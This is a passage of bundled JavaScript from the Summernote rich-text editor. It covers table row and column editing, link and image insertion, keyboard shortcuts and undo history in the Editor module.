;
        adjustStartPoint(row.rowIndex, cellspanIndex, cell, isThisSelectedCell);
        setVirtualTablePosition(row.rowIndex, cellspanIndex, row, cell, cellHasRowspan, true, true);
      }
    }
  }
  /**
   * Process validation and adjust of start point if needed
   *
   * @param {int} rowIndex
   * @param {int} cellIndex
   * @param {object} cell
   * @param {bool} isSelectedCell
   */


  function adjustStartPoint(rowIndex, cellIndex, cell, isSelectedCell) {
    if (rowIndex === _startPoint.rowPos && _startPoint.colPos >= cell.cellIndex && cell.cellIndex <= cellIndex && !isSelectedCell) {
      _startPoint.colPos++;
    }
  }
  /**
   * Create virtual table of cells with all cells, including span cells.
   */


  function createVirtualTable() {
    const rows = domTable.rows;

    for (let rowIndex = 0; rowIndex < rows.length; rowIndex++) {
      const cells = rows[rowIndex].cells;

      for (let cellIndex = 0; cellIndex < cells.length; cellIndex++) {
        addCellInfoToVirtual(rows[rowIndex], cells[cellIndex]);
      }
    }
  }
  /**
   * Get action to be applied on the cell.
   *
   * @param {object} cell virtual table cell to apply action
   */


  function getDeleteResultActionToCell(cell) {
    switch (where) {
      case TableResultAction.where.Column:
        if (cell.isColSpan) {
          return TableResultAction.resultAction.SubtractSpanCount;
        }

        break;

      case TableResultAction.where.Row:
        if (!cell.isVirtual && cell.isRowSpan) {
          return TableResultAction.resultAction.AddCell;
        } else if (cell.isRowSpan) {
          return TableResultAction.resultAction.SubtractSpanCount;
        }

        break;
    }

    return TableResultAction.resultAction.RemoveCell;
  }
  /**
   * Get action to be applied on the cell.
   *
   * @param {object} cell virtual table cell to apply action
   */


  function getAddResultActionToCell(cell) {
    switch (where) {
      case TableResultAction.where.Column:
        if (cell.isColSpan) {
          return TableResultAction.resultAction.SumSpanCount;
        } else if (cell.isRowSpan && cell.isVirtual) {
          return TableResultAction.resultAction.Ignore;
        }

        break;

      case TableResultAction.where.Row:
        if (cell.isRowSpan) {
          return TableResultAction.resultAction.SumSpanCount;
        } else if (cell.isColSpan && cell.isVirtual) {
          return TableResultAction.resultAction.Ignore;
        }

        break;
    }

    return TableResultAction.resultAction.AddCell;
  }

  function init() {
    setStartPoint();
    createVirtualTable();
  } /// ///////////////////////////////////////////
  // Public functions
  /// ///////////////////////////////////////////

  /**
   * Recover array os what to do in table.
   */


  this.getActionList = function () {
    const fixedRow = where === TableResultAction.where.Row ? _startPoint.rowPos : -1;
    const fixedCol = where === TableResultAction.where.Column ? _startPoint.colPos : -1;
    let actualPosition = 0;
    let canContinue = true;

    while (canContinue) {
      const rowPosition = fixedRow >= 0 ? fixedRow : actualPosition;
      const colPosition = fixedCol >= 0 ? fixedCol : actualPosition;
      const row = _virtualTable[rowPosition];

      if (!row) {
        canContinue = false;
        return _actionCellList;
      }

      const cell = row[colPosition];

      if (!cell) {
        canContinue = false;
        return _actionCellList;
      } // Define action to be applied in this cell


      let resultAction = TableResultAction.resultAction.Ignore;

      switch (action) {
        case TableResultAction.requestAction.Add:
          resultAction = getAddResultActionToCell(cell);
          break;

        case TableResultAction.requestAction.Delete:
          resultAction = getDeleteResultActionToCell(cell);
          break;
      }

      _actionCellList.push(getActionCell(cell, resultAction, rowPosition, colPosition));

      actualPosition++;
    }

    return _actionCellList;
  };

  init();
};
/**
*
* Where action occours enum.
*/


TableResultAction.where = {
  'Row': 0,
  'Column': 1
};
/**
*
* Requested action to apply enum.
*/

TableResultAction.requestAction = {
  'Add': 0,
  'Delete': 1
};
/**
*
* Result action to be executed enum.
*/

TableResultAction.resultAction = {
  'Ignore': 0,
  'SubtractSpanCount': 1,
  'RemoveCell': 2,
  'AddCell': 3,
  'SumSpanCount': 4
};
/**
 *
 * @class editing.Table
 *
 * Table
 *
 */

class Table_Table {
  /**
   * handle tab key
   *
   * @param {WrappedRange} rng
   * @param {Boolean} isShift
   */
  tab(rng, isShift) {
    const cell = dom.ancestor(rng.commonAncestor(), dom.isCell);
    const table = dom.ancestor(cell, dom.isTable);
    const cells = dom.listDescendant(table, dom.isCell);
    const nextCell = lists[isShift ? 'prev' : 'next'](cells, cell);

    if (nextCell) {
      core_range.create(nextCell, 0).select();
    }
  }
  /**
   * Add a new row
   *
   * @param {WrappedRange} rng
   * @param {String} position (top/bottom)
   * @return {Node}
   */


  addRow(rng, position) {
    const cell = dom.ancestor(rng.commonAncestor(), dom.isCell);
    const currentTr = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell).closest('tr');
    const trAttributes = this.recoverAttributes(currentTr);
    const html = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()('<tr' + trAttributes + '></tr>');
    const vTable = new TableResultAction(cell, TableResultAction.where.Row, TableResultAction.requestAction.Add, external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(currentTr).closest('table')[0]);
    const actions = vTable.getActionList();

    for (let idCell = 0; idCell < actions.length; idCell++) {
      const currentCell = actions[idCell];
      const tdAttributes = this.recoverAttributes(currentCell.baseCell);

      switch (currentCell.action) {
        case TableResultAction.resultAction.AddCell:
          html.append('<td' + tdAttributes + '>' + dom.blank + '</td>');
          break;

        case TableResultAction.resultAction.SumSpanCount:
          if (position === 'top') {
            const baseCellTr = currentCell.baseCell.parent;
            const isTopFromRowSpan = (!baseCellTr ? 0 : currentCell.baseCell.closest('tr').rowIndex) <= currentTr[0].rowIndex;

            if (isTopFromRowSpan) {
              const newTd = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()('<div></div>').append(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()('<td' + tdAttributes + '>' + dom.blank + '</td>').removeAttr('rowspan')).html();
              html.append(newTd);
              break;
            }
          }

          let rowspanNumber = parseInt(currentCell.baseCell.rowSpan, 10);
          rowspanNumber++;
          currentCell.baseCell.setAttribute('rowSpan', rowspanNumber);
          break;
      }
    }

    if (position === 'top') {
      currentTr.before(html);
    } else {
      const cellHasRowspan = cell.rowSpan > 1;

      if (cellHasRowspan) {
        const lastTrIndex = currentTr[0].rowIndex + (cell.rowSpan - 2);
        external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(currentTr).parent().find('tr')[lastTrIndex]).after(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(html));
        return;
      }

      currentTr.after(html);
    }
  }
  /**
   * Add a new col
   *
   * @param {WrappedRange} rng
   * @param {String} position (left/right)
   * @return {Node}
   */


  addCol(rng, position) {
    const cell = dom.ancestor(rng.commonAncestor(), dom.isCell);
    const row = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell).closest('tr');
    const rowsGroup = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(row).siblings();
    rowsGroup.push(row);
    const vTable = new TableResultAction(cell, TableResultAction.where.Column, TableResultAction.requestAction.Add, external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(row).closest('table')[0]);
    const actions = vTable.getActionList();

    for (let actionIndex = 0; actionIndex < actions.length; actionIndex++) {
      const currentCell = actions[actionIndex];
      const tdAttributes = this.recoverAttributes(currentCell.baseCell);

      switch (currentCell.action) {
        case TableResultAction.resultAction.AddCell:
          if (position === 'right') {
            external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(currentCell.baseCell).after('<td' + tdAttributes + '>' + dom.blank + '</td>');
          } else {
            external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(currentCell.baseCell).before('<td' + tdAttributes + '>' + dom.blank + '</td>');
          }

          break;

        case TableResultAction.resultAction.SumSpanCount:
          if (position === 'right') {
            let colspanNumber = parseInt(currentCell.baseCell.colSpan, 10);
            colspanNumber++;
            currentCell.baseCell.setAttribute('colSpan', colspanNumber);
          } else {
            external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(currentCell.baseCell).before('<td' + tdAttributes + '>' + dom.blank + '</td>');
          }

          break;
      }
    }
  }
  /*
  * Copy attributes from element.
  *
  * @param {object} Element to recover attributes.
  * @return {string} Copied string elements.
  */


  recoverAttributes(el) {
    let resultStr = '';

    if (!el) {
      return resultStr;
    }

    const attrList = el.attributes || [];

    for (let i = 0; i < attrList.length; i++) {
      if (attrList[i].name.toLowerCase() === 'id') {
        continue;
      }

      if (attrList[i].specified) {
        resultStr += ' ' + attrList[i].name + '=\'' + attrList[i].value + '\'';
      }
    }

    return resultStr;
  }
  /**
   * Delete current row
   *
   * @param {WrappedRange} rng
   * @return {Node}
   */


  deleteRow(rng) {
    const cell = dom.ancestor(rng.commonAncestor(), dom.isCell);
    const row = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell).closest('tr');
    const cellPos = row.children('td, th').index(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell));
    const rowPos = row[0].rowIndex;
    const vTable = new TableResultAction(cell, TableResultAction.where.Row, TableResultAction.requestAction.Delete, external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(row).closest('table')[0]);
    const actions = vTable.getActionList();

    for (let actionIndex = 0; actionIndex < actions.length; actionIndex++) {
      if (!actions[actionIndex]) {
        continue;
      }

      const baseCell = actions[actionIndex].baseCell;
      const virtualPosition = actions[actionIndex].virtualTable;
      const hasRowspan = baseCell.rowSpan && baseCell.rowSpan > 1;
      let rowspanNumber = hasRowspan ? parseInt(baseCell.rowSpan, 10) : 0;

      switch (actions[actionIndex].action) {
        case TableResultAction.resultAction.Ignore:
          continue;

        case TableResultAction.resultAction.AddCell:
          const nextRow = row.next('tr')[0];

          if (!nextRow) {
            continue;
          }

          const cloneRow = row[0].cells[cellPos];

          if (hasRowspan) {
            if (rowspanNumber > 2) {
              rowspanNumber--;
              nextRow.insertBefore(cloneRow, nextRow.cells[cellPos]);
              nextRow.cells[cellPos].setAttribute('rowSpan', rowspanNumber);
              nextRow.cells[cellPos].innerHTML = '';
            } else if (rowspanNumber === 2) {
              nextRow.insertBefore(cloneRow, nextRow.cells[cellPos]);
              nextRow.cells[cellPos].removeAttribute('rowSpan');
              nextRow.cells[cellPos].innerHTML = '';
            }
          }

          continue;

        case TableResultAction.resultAction.SubtractSpanCount:
          if (hasRowspan) {
            if (rowspanNumber > 2) {
              rowspanNumber--;
              baseCell.setAttribute('rowSpan', rowspanNumber);

              if (virtualPosition.rowIndex !== rowPos && baseCell.cellIndex === cellPos) {
                baseCell.innerHTML = '';
              }
            } else if (rowspanNumber === 2) {
              baseCell.removeAttribute('rowSpan');

              if (virtualPosition.rowIndex !== rowPos && baseCell.cellIndex === cellPos) {
                baseCell.innerHTML = '';
              }
            }
          }

          continue;

        case TableResultAction.resultAction.RemoveCell:
          // Do not need remove cell because row will be deleted.
          continue;
      }
    }

    row.remove();
  }
  /**
   * Delete current col
   *
   * @param {WrappedRange} rng
   * @return {Node}
   */


  deleteCol(rng) {
    const cell = dom.ancestor(rng.commonAncestor(), dom.isCell);
    const row = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell).closest('tr');
    const cellPos = row.children('td, th').index(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell));
    const vTable = new TableResultAction(cell, TableResultAction.where.Column, TableResultAction.requestAction.Delete, external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(row).closest('table')[0]);
    const actions = vTable.getActionList();

    for (let actionIndex = 0; actionIndex < actions.length; actionIndex++) {
      if (!actions[actionIndex]) {
        continue;
      }

      switch (actions[actionIndex].action) {
        case TableResultAction.resultAction.Ignore:
          continue;

        case TableResultAction.resultAction.SubtractSpanCount:
          const baseCell = actions[actionIndex].baseCell;
          const hasColspan = baseCell.colSpan && baseCell.colSpan > 1;

          if (hasColspan) {
            let colspanNumber = baseCell.colSpan ? parseInt(baseCell.colSpan, 10) : 0;

            if (colspanNumber > 2) {
              colspanNumber--;
              baseCell.setAttribute('colSpan', colspanNumber);

              if (baseCell.cellIndex === cellPos) {
                baseCell.innerHTML = '';
              }
            } else if (colspanNumber === 2) {
              baseCell.removeAttribute('colSpan');

              if (baseCell.cellIndex === cellPos) {
                baseCell.innerHTML = '';
              }
            }
          }

          continue;

        case TableResultAction.resultAction.RemoveCell:
          dom.remove(actions[actionIndex].baseCell, true);
          continue;
      }
    }
  }
  /**
   * create empty table element
   *
   * @param {Number} rowCount
   * @param {Number} colCount
   * @return {Node}
   */


  createTable(colCount, rowCount, options) {
    const tds = [];
    let tdHTML;

    for (let idxCol = 0; idxCol < colCount; idxCol++) {
      tds.push('<td>' + dom.blank + '</td>');
    }

    tdHTML = tds.join('');
    const trs = [];
    let trHTML;

    for (let idxRow = 0; idxRow < rowCount; idxRow++) {
      trs.push('<tr>' + tdHTML + '</tr>');
    }

    trHTML = trs.join('');
    const $table = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()('<table>' + trHTML + '</table>');

    if (options && options.tableClassName) {
      $table.addClass(options.tableClassName);
    }

    return $table[0];
  }
  /**
   * Delete current table
   *
   * @param {WrappedRange} rng
   * @return {Node}
   */


  deleteTable(rng) {
    const cell = dom.ancestor(rng.commonAncestor(), dom.isCell);
    external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(cell).closest('table').remove();
  }

}
// CONCATENATED MODULE: ./src/js/base/module/Editor.js













const KEY_BOGUS = 'bogus';
/**
 * @class Editor
 */

class Editor_Editor {
  constructor(context) {
    this.context = context;
    this.$note = context.layoutInfo.note;
    this.$editor = context.layoutInfo.editor;
    this.$editable = context.layoutInfo.editable;
    this.options = context.options;
    this.lang = this.options.langInfo;
    this.editable = this.$editable[0];
    this.lastRange = null;
    this.snapshot = null;
    this.style = new Style_Style();
    this.table = new Table_Table();
    this.typing = new Typing_Typing(context);
    this.bullet = new Bullet_Bullet();
    this.history = new History_History(this.$editable);
    this.context.memo('help.undo', this.lang.help.undo);
    this.context.memo('help.redo', this.lang.help.redo);
    this.context.memo('help.tab', this.lang.help.tab);
    this.context.memo('help.untab', this.lang.help.untab);
    this.context.memo('help.insertParagraph', this.lang.help.insertParagraph);
    this.context.memo('help.insertOrderedList', this.lang.help.insertOrderedList);
    this.context.memo('help.insertUnorderedList', this.lang.help.insertUnorderedList);
    this.context.memo('help.indent', this.lang.help.indent);
    this.context.memo('help.outdent', this.lang.help.outdent);
    this.context.memo('help.formatPara', this.lang.help.formatPara);
    this.context.memo('help.insertHorizontalRule', this.lang.help.insertHorizontalRule);
    this.context.memo('help.fontName', this.lang.help.fontName); // native commands(with execCommand), generate function for execCommand

    const commands = ['bold', 'italic', 'underline', 'strikethrough', 'superscript', 'subscript', 'justifyLeft', 'justifyCenter', 'justifyRight', 'justifyFull', 'formatBlock', 'removeFormat', 'backColor'];

    for (let idx = 0, len = commands.length; idx < len; idx++) {
      this[commands[idx]] = (sCmd => {
        return value => {
          this.beforeCommand();
          document.execCommand(sCmd, false, value);
          this.afterCommand(true);
        };
      })(commands[idx]);

      this.context.memo('help.' + commands[idx], this.lang.help[commands[idx]]);
    }

    this.fontName = this.wrapCommand(value => {
      return this.fontStyling('font-family', env.validFontName(value));
    });
    this.fontSize = this.wrapCommand(value => {
      const unit = this.currentStyle()['font-size-unit'];
      return this.fontStyling('font-size', value + unit);
    });
    this.fontSizeUnit = this.wrapCommand(value => {
      const size = this.currentStyle()['font-size'];
      return this.fontStyling('font-size', size + value);
    });

    for (let idx = 1; idx <= 6; idx++) {
      this['formatH' + idx] = (idx => {
        return () => {
          this.formatBlock('H' + idx);
        };
      })(idx);

      this.context.memo('help.formatH' + idx, this.lang.help['formatH' + idx]);
    }

    ;
    this.insertParagraph = this.wrapCommand(() => {
      this.typing.insertParagraph(this.editable);
    });
    this.insertOrderedList = this.wrapCommand(() => {
      this.bullet.insertOrderedList(this.editable);
    });
    this.insertUnorderedList = this.wrapCommand(() => {
      this.bullet.insertUnorderedList(this.editable);
    });
    this.indent = this.wrapCommand(() => {
      this.bullet.indent(this.editable);
    });
    this.outdent = this.wrapCommand(() => {
      this.bullet.outdent(this.editable);
    });
    /**
     * insertNode
     * insert node
     * @param {Node} node
     */

    this.insertNode = this.wrapCommand(node => {
      if (this.isLimited(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(node).text().length)) {
        return;
      }

      const rng = this.getLastRange();
      rng.insertNode(node);
      this.setLastRange(core_range.createFromNodeAfter(node).select());
    });
    /**
     * insert text
     * @param {String} text
     */

    this.insertText = this.wrapCommand(text => {
      if (this.isLimited(text.length)) {
        return;
      }

      const rng = this.getLastRange();
      const textNode = rng.insertNode(dom.createText(text));
      this.setLastRange(core_range.create(textNode, dom.nodeLength(textNode)).select());
    });
    /**
     * paste HTML
     * @param {String} markup
     */

    this.pasteHTML = this.wrapCommand(markup => {
      if (this.isLimited(markup.length)) {
        return;
      }

      markup = this.context.invoke('codeview.purify', markup);
      const contents = this.getLastRange().pasteHTML(markup);
      this.setLastRange(core_range.createFromNodeAfter(lists.last(contents)).select());
    });
    /**
     * formatBlock
     *
     * @param {String} tagName
     */

    this.formatBlock = this.wrapCommand((tagName, $target) => {
      const onApplyCustomStyle = this.options.callbacks.onApplyCustomStyle;

      if (onApplyCustomStyle) {
        onApplyCustomStyle.call(this, $target, this.context, this.onFormatBlock);
      } else {
        this.onFormatBlock(tagName, $target);
      }
    });
    /**
     * insert horizontal rule
     */

    this.insertHorizontalRule = this.wrapCommand(() => {
      const hrNode = this.getLastRange().insertNode(dom.create('HR'));

      if (hrNode.nextSibling) {
        this.setLastRange(core_range.create(hrNode.nextSibling, 0).normalize().select());
      }
    });
    /**
     * lineHeight
     * @param {String} value
     */

    this.lineHeight = this.wrapCommand(value => {
      this.style.stylePara(this.getLastRange(), {
        lineHeight: value
      });
    });
    /**
     * create link (command)
     *
     * @param {Object} linkInfo
     */

    this.createLink = this.wrapCommand(linkInfo => {
      let linkUrl = linkInfo.url;
      const linkText = linkInfo.text;
      const isNewWindow = linkInfo.isNewWindow;
      const checkProtocol = linkInfo.checkProtocol;
      let rng = linkInfo.range || this.getLastRange();
      const additionalTextLength = linkText.length - rng.toString().length;

      if (additionalTextLength > 0 && this.isLimited(additionalTextLength)) {
        return;
      }

      const isTextChanged = rng.toString() !== linkText; // handle spaced urls from input

      if (typeof linkUrl === 'string') {
        linkUrl = linkUrl.trim();
      }

      if (this.options.onCreateLink) {
        linkUrl = this.options.onCreateLink(linkUrl);
      } else if (checkProtocol) {
        // if url doesn't have any protocol and not even a relative or a label, use http:// as default
        linkUrl = /^([A-Za-z][A-Za-z0-9+-.]*\:|#|\/)/.test(linkUrl) ? linkUrl : this.options.defaultProtocol + linkUrl;
      }

      let anchors = [];

      if (isTextChanged) {
        rng = rng.deleteContents();
        const anchor = rng.insertNode(external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()('<A>' + linkText + '</A>')[0]);
        anchors.push(anchor);
      } else {
        anchors = this.style.styleNodes(rng, {
          nodeName: 'A',
          expandClosestSibling: true,
          onlyPartialContains: true
        });
      }

      external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default.a.each(anchors, (idx, anchor) => {
        external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(anchor).attr('href', linkUrl);

        if (isNewWindow) {
          external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(anchor).attr('target', '_blank');
        } else {
          external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(anchor).removeAttr('target');
        }
      });
      const startRange = core_range.createFromNodeBefore(lists.head(anchors));
      const startPoint = startRange.getStartPoint();
      const endRange = core_range.createFromNodeAfter(lists.last(anchors));
      const endPoint = endRange.getEndPoint();
      this.setLastRange(core_range.create(startPoint.node, startPoint.offset, endPoint.node, endPoint.offset).select());
    });
    /**
     * setting color
     *
     * @param {Object} sObjColor  color code
     * @param {String} sObjColor.foreColor foreground color
     * @param {String} sObjColor.backColor background color
     */

    this.color = this.wrapCommand(colorInfo => {
      const foreColor = colorInfo.foreColor;
      const backColor = colorInfo.backColor;

      if (foreColor) {
        document.execCommand('foreColor', false, foreColor);
      }

      if (backColor) {
        document.execCommand('backColor', false, backColor);
      }
    });
    /**
     * Set foreground color
     *
     * @param {String} colorCode foreground color code
     */

    this.foreColor = this.wrapCommand(colorInfo => {
      document.execCommand('styleWithCSS', false, true);
      document.execCommand('foreColor', false, colorInfo);
    });
    /**
     * insert Table
     *
     * @param {String} dimension of table (ex : "5x5")
     */

    this.insertTable = this.wrapCommand(dim => {
      const dimension = dim.split('x');
      const rng = this.getLastRange().deleteContents();
      rng.insertNode(this.table.createTable(dimension[0], dimension[1], this.options));
    });
    /**
     * remove media object and Figure Elements if media object is img with Figure.
     */

    this.removeMedia = this.wrapCommand(() => {
      let $target = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(this.restoreTarget()).parent();

      if ($target.closest('figure').length) {
        $target.closest('figure').remove();
      } else {
        $target = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(this.restoreTarget()).detach();
      }

      this.context.triggerEvent('media.delete', $target, this.$editable);
    });
    /**
     * float me
     *
     * @param {String} value
     */

    this.floatMe = this.wrapCommand(value => {
      const $target = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(this.restoreTarget());
      $target.toggleClass('note-float-left', value === 'left');
      $target.toggleClass('note-float-right', value === 'right');
      $target.css('float', value === 'none' ? '' : value);
    });
    /**
     * resize overlay element
     * @param {String} value
     */

    this.resize = this.wrapCommand(value => {
      const $target = external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(this.restoreTarget());
      value = parseFloat(value);

      if (value === 0) {
        $target.css('width', '');
      } else {
        $target.css({
          width: value * 100 + '%',
          height: ''
        });
      }
    });
  }

  initialize() {
    // bind custom events
    this.$editable.on('keydown', event => {
      if (event.keyCode === core_key.code.ENTER) {
        this.context.triggerEvent('enter', event);
      }

      this.context.triggerEvent('keydown', event); // keep a snapshot to limit text on input event

      this.snapshot = this.history.makeSnapshot();

      if (!event.isDefaultPrevented()) {
        if (this.options.shortcuts) {
          this.handleKeyMap(event);
        } else {
          this.preventDefaultEditableShortCuts(event);
        }
      }

      if (this.isLimited(1, event)) {
        const lastRange = this.getLastRange();

        if (lastRange.eo - lastRange.so === 0) {
          return false;
        }
      }

      this.setLastRange();
    }).on('keyup', event => {
      this.setLastRange();
      this.context.triggerEvent('keyup', event);
    }).on('focus', event => {
      this.setLastRange();
      this.context.triggerEvent('focus', event);
    }).on('blur', event => {
      this.context.triggerEvent('blur', event);
    }).on('mousedown', event => {
      this.context.triggerEvent('mousedown', event);
    }).on('mouseup', event => {
      this.setLastRange();
      this.history.recordUndo();
      this.context.triggerEvent('mouseup', event);
    }).on('scroll', event => {
      this.context.triggerEvent('scroll', event);
    }).on('paste', event => {
      this.setLastRange();
      this.context.triggerEvent('paste', event);
    }).on('input', event => {
      // To limit composition characters (e.g. Korean)
      if (this.isLimited(0) && this.snapshot) {
        this.history.applySnapshot(this.snapshot);
      }
    });
    this.$editable.attr('spellcheck', this.options.spellCheck);
    this.$editable.attr('autocorrect', this.options.spellCheck);

    if (this.options.disableGrammar) {
      this.$editable.attr('data-gramm', false);
    } // init content before set event


    this.$editable.html(dom.html(this.$note) || dom.emptyPara);
    this.$editable.on(env.inputEventName, func.debounce(() => {
      this.context.triggerEvent('change', this.$editable.html(), this.$editable);
    }, 10));
    this.$editor.on('focusin', event => {
      this.context.triggerEvent('focusin', event);
    }).on('focusout', event => {
      this.context.triggerEvent('focusout', event);
    });

    if (!this.options.airMode) {
      if (this.options.width) {
        this.$editor.outerWidth(this.options.width);
      }

      if (this.options.height) {
        this.$editable.outerHeight(this.options.height);
      }

      if (this.options.maxHeight) {
        this.$editable.css('max-height', this.options.maxHeight);
      }

      if (this.options.minHeight) {
        this.$editable.css('min-height', this.options.minHeight);
      }
    }

    this.history.recordUndo();
    this.setLastRange();
  }

  destroy() {
    this.$editable.off();
  }

  handleKeyMap(event) {
    const keyMap = this.options.keyMap[env.isMac ? 'mac' : 'pc'];
    const keys = [];

    if (event.metaKey) {
      keys.push('CMD');
    }

    if (event.ctrlKey && !event.altKey) {
      keys.push('CTRL');
    }

    if (event.shiftKey) {
      keys.push('SHIFT');
    }

    const keyName = core_key.nameFromCode[event.keyCode];

    if (keyName) {
      keys.push(keyName);
    }

    const eventName = keyMap[keys.join('+')];

    if (keyName === 'TAB' && !this.options.tabDisable) {
      this.afterCommand();
    } else if (eventName) {
      if (this.context.invoke(eventName) !== false) {
        event.preventDefault();
      }
    } else if (core_key.isEdit(event.keyCode)) {
      this.afterCommand();
    }
  }

  preventDefaultEditableShortCuts(event) {
    // B(Bold, 66) / I(Italic, 73) / U(Underline, 85)
    if ((event.ctrlKey || event.metaKey) && lists.contains([66, 73, 85], event.keyCode)) {
      event.preventDefault();
    }
  }

  isLimited(pad, event) {
    pad = pad || 0;

    if (typeof event !== 'undefined') {
      if (core_key.isMove(event.keyCode) || core_key.isNavigation(event.keyCode) || event.ctrlKey || event.metaKey || lists.contains([core_key.code.BACKSPACE, core_key.code.DELETE], event.keyCode)) {
        return false;
      }
    }

    if (this.options.maxTextLength > 0) {
      if (this.$editable.text().length + pad > this.options.maxTextLength) {
        return true;
      }
    }

    return false;
  }
  /**
   * create range
   * @return {WrappedRange}
   */


  createRange() {
    this.focus();
    this.setLastRange();
    return this.getLastRange();
  }

  setLastRange(rng) {
    if (rng) {
      this.lastRange = rng;
    } else {
      this.lastRange = core_range.create(this.editable);

      if (external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default()(this.lastRange.sc).closest('.note-editable').length === 0) {
        this.lastRange = core_range.createFromBodyElement(this.editable);
      }
    }
  }

  getLastRange() {
    if (!this.lastRange) {
      this.setLastRange();
    }

    return this.lastRange;
  }
  /**
   * saveRange
   *
   * save current range
   *
   * @param {Boolean} [thenCollapse=false]
   */


  saveRange(thenCollapse) {
    if (thenCollapse) {
      this.getLastRange().collapse().select();
    }
  }
  /**
   * restoreRange
   *
   * restore lately range
   */


  restoreRange() {
    if (this.lastRange) {
      this.lastRange.select();
      this.focus();
    }
  }

  saveTarget(node) {
    this.$editable.data('target', node);
  }

  clearTarget() {
    this.$editable.removeData('target');
  }

  restoreTarget() {
    return this.$editable.data('target');
  }
  /**
   * currentStyle
   *
   * current style
   * @return {Object|Boolean} unfocus
   */


  currentStyle() {
    let rng = core_range.create();

    if (rng) {
      rng = rng.normalize();
    }

    return rng ? this.style.current(rng) : this.style.fromNode(this.$editable);
  }
  /**
   * style from node
   *
   * @param {jQuery} $node
   * @return {Object}
   */


  styleFromNode($node) {
    return this.style.fromNode($node);
  }
  /**
   * undo
   */


  undo() {
    this.context.triggerEvent('before.command', this.$editable.html());
    this.history.undo();
    this.context.triggerEvent('change', this.$editable.html(), this.$editable);
  }
  /*
  * commit
  */


  commit() {
    this.context.triggerEvent('before.command', this.$editable.html());
    this.history.commit();
    this.context.triggerEvent('change', this.$editable.html(), this.$editable);
  }
  /**
   * redo
   */


  redo() {
    this.context.triggerEvent('before.command', this.$editable.html());
    this.history.redo();
    this.context.triggerEvent('change', this.$editable.html(), this.$editable);
  }
  /**
   * before command
   */


  beforeCommand() {
    this.context.triggerEvent('before.command', this.$editable.html()); // keep focus on editable before command execution

    this.focus();
  }
  /**
   * after command
   * @param {Boolean} isPreventTrigger
   */


  afterCommand(isPreventTrigger) {
    this.normalizeContent();
    this.history.recordUndo();

    if (!isPreventTrigger) {
      this.context.triggerEvent('change', this.$editable.html(), this.$editable);
    }
  }
  /**
   * handle tab key
   */


  tab() {
    const rng = this.getLastRange();

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.table.tab(rng);
    } else {
      if (this.options.tabSize === 0) {
        return false;
      }

      if (!this.isLimited(this.options.tabSize)) {
        this.beforeCommand();
        this.typing.insertTab(rng, this.options.tabSize);
        this.afterCommand();
      }
    }
  }
  /**
   * handle shift+tab key
   */


  untab() {
    const rng = this.getLastRange();

    if (rng.isCollapsed() && rng.isOnCell()) {
      this.table.tab(rng, true);
    } else {
      if (this.options.tabSize === 0) {
        return false;
      }
    }
  }
  /**
   * run given function between beforeCommand and afterCommand
   */


  wrapCommand(fn) {
    return function () {
      this.beforeCommand();
      fn.apply(this, arguments);
      this.afterCommand();
    };
  }
  /**
   * insert image
   *
   * @param {String} src
   * @param {String|Function} param
   * @return {Promise}
   */


  insertImage(src, param) {
    return createImage(src, param).then($image => {
      this.beforeCommand();

      if (typeof param === 'function') {
        param($image);
      } else {
        if (typeof param === 'string') {
          $image.attr('data-filename', param);
        }

        $image.css('width', Math.min(this.$editable.width(), $image.width()));
      }

      $image.show();
      this.getLastRange().insertNode($image[0]);
      this.setLastRange(core_range.createFromNodeAfter($image[0]).select());
      this.afterCommand();
    }).fail(e => {
      this.context.triggerEvent('image.upload.error', e);
    });
  }
  /**
   * insertImages
   * @param {File[]} files
   */


  insertImagesAsDataURL(files) {
    external_root_jQuery_commonjs2_jquery_commonjs_jquery_amd_jquery_default.a.each(files, (idx, file) => {
      const filename = file.name;

      if (this.options.maximumImageFileSize && this.options.maximumImageFileSize < file.size) {
        this.context.triggerEvent('image.upload.error', this.lang.image.maximumFileSizeError);
      } else {
        readFileAsDataURL(file).then(dataURL => {
          return this.insertImage(dataURL, filename);
        }).fail(() => {
          this.context.triggerEvent('image.upload.error');
        });
      }
    });
  }
  /**
   * insertImagesOrCallback
   * @param {File[]} files
   */


  insertImagesOrCallback(files) {
    const callbacks = this.options.callbacks; // If onImageUpload set,

    if (callbacks.onImageUpload) {
